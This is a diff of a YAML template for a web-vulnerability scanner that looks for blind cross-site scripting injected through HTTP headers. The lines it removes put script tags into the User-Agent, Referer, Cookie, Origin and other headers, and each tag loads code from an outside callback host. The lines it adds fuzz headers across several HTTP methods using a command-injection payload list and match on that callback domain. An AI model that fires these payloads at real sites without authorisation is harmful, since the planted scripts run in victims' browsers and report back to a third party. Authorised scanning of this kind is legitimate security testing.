@@ -1,19 +1,43 @@
-id: header-blind-xss
+id: header-blind-xss-injection
 
 info:
-  name: Delivering blind xss payloads via headers
-  author: panch0r3d
-  severity: medium
+  name: Header BlindXSS Injection
+  author: MRiambatman
+  severity: high
+  description: Fuzzing headers for blindxss 
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        §header§: §payload§
+
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        §header§: §payload§
+
+      - |
+        PUT / HTTP/1.1
+        Host: {{Hostname}}
+        §header§: §payload§
+
+      - |
+        TRACE / HTTP/1.1
+        Host: {{Hostname}}
+        §header§: §payload§
+     
+    payloads:
+      header: helpers/payloads/request-headers.txt
+      payload: helpers/payloads/command-injection.txt
+    attack: pitchfork
     redirects: true
-    max-redirects: 6
-    headers:
-      User-Agent: "Mozilla UACanary12345\'&#8211;><script src=https://iambatman.xss.ht></script>"
-      Gibberish: "XFFCanary12345.{{Hostname}}'&#8211;><script src=https://iambatman.xss.ht></script>"
-      Referer: "RFcanary12345.comRF'&#8211;><script src=https://iambatman.xss.ht></script>"
-      Cookie: "CKCanary12345=qwertyCK'&#8211;><script src=https://iambatman.xss.ht></script>"
-      Origin: "ORCanary12345.comOR'&#8211;><script src=https://iambatman.xss.ht></script>"
+    matchers:
+      - type: word
+        words:
+          - "*.xss.ht"
+        part: body
+    
+
+
